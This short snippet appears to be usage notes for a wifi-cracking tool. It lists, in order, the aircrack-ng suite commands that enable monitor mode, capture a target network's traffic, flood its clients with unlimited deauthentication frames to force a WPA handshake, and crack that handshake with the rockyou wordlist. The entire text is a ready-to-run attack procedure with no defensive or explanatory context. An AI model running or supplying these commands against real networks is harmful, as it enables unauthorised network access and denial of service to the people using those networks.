If you want to run the code line by line in the terminal:
---------------------------------------------------------
#sudo airmon-ng check kill
#sudo airmon-ng start wlan0
#sudo airodump-ng wlan0
#sudo airodump-ng -w {filename} -c {channel} --bssid {bssid} wlan0
------------------------------------------------------------------
Open a new terminal
#sudo aireplay-ng --deauth 0 -a {bssid} wlan0
-----------------------------------------------
Once Handshake is Captured
#sudo airmon-ng stop wlan0
#sudo aircrack-ng {cap_file} -w /usr/share/wordlists/rockyou.txt
